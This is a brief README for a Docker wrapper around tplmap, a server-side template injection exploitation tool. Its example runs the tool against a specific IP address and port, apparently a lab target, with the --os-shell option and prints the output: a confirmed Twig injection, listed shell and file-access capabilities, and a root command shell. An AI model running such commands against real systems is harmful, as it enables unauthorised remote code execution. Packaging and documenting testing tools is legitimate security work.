# tplmap_docker
Just Dockerfile to build tplmap in docker

## Run
```
$ docker run -it --rm tplmap -u http://94.237.62.195:49088/ -d name=john --os-shell
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin is testing blind injection
[+] Twig plugin is testing rendering with tag '{{*}}'
[+] Twig plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  POST parameter: name
  Engine: Twig
  Injection: {{*}}
  Context: text
  OS: Linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, php code

[+] Run commands on the operating system.
Linux $ id
uid=0(root) gid=0(root) groups=0(root)
```
